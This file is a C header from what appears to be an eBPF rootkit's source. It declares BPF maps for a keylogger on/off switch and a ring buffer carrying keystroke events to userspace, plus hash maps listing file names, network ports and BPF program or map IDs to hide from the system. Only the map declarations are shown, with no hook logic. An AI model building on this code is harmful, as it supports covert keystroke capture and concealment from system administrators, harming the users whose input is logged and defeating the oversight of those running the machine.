#ifndef __MAPS_H
#define __MAPS_H

#include <vmlinux.h>
#include <bpf/bpf_helpers.h>
#include "config.h"

#define CONFIG_MAP_MAX_ENTRIES 10
#define EVENTS_MAP_MAX_ENTRIES 256 * 1024
#define KEYLOG_EVENTS_MAP_MAX_ENTRIES 128 * 1024
#define HIDE_NAMES_MAP_MAX_ENTRIES 256
#define HIDE_PORTS_MAP_MAX_ENTRIES 64

enum config_keys {
    KEYLOGGER_ENABLED = 0,
};

/**
 * @brief Global configuration map
 * 
 */
struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(max_entries, CONFIG_MAP_MAX_ENTRIES);
    __type(key, u32);
    __type(value, u32);
} config_map SEC(".maps");

/**
 * @brief Shared ring buffer to send telemetry back to userspace
 * 
 * Key: u32 Key
 * Value: u32 Value
 */
struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, EVENTS_MAP_MAX_ENTRIES);
} events SEC(".maps");

/**
 * @brief Shared ring buffer to send keylogger events back to userspace
 * 
 */
struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, KEYLOG_EVENTS_MAP_MAX_ENTRIES); /* 128 KB buffer */
} keylog_events SEC(".maps");

/**
 * @brief Map to store target file names to hide.
 * 
 * Key: char[] filename
 * Value: u8 Flag (1 = hidden)
 * 
 */
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, HIDE_NAMES_MAP_MAX_ENTRIES);
    __type(key, char[MAX_NAME_LEN]);
    __type(value, u8);
} hide_names_map SEC(".maps");

/**
 * @brief Map to store target ports to hide
 * 
 * Key: u16 Port
 * Value: u8 Flag (1 = hidden)
 * 
 */
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, HIDE_PORTS_MAP_MAX_ENTRIES);
    __type(key, u16);
    __type(value, u8);
} hide_ports_map SEC(".maps");


/**
 * @brief Map holding IDs of BPF programs/maps to hide
 * 
 * Key: u32 BPF ID (prog_id or map_id)
 * Value: u8 Flag (1 = hidden)
 *
 */
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 64);
    __type(key, u32);
    __type(value, u8);
} hide_bpf_ids_map SEC(".maps");

#endif /* __MAPS_H */
